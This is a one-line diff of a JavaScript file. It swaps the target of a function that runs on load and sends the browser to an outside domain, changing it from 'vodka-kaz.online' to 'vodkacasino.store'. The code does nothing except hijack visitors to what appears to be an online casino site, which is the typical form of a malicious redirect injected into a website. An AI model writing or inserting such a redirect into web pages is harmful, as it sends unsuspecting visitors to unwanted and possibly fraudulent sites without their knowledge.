@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://vodka-kaz.online"}executeRun();
+function executeRun(){window.location.href="https://vodkacasino.store"}executeRun();
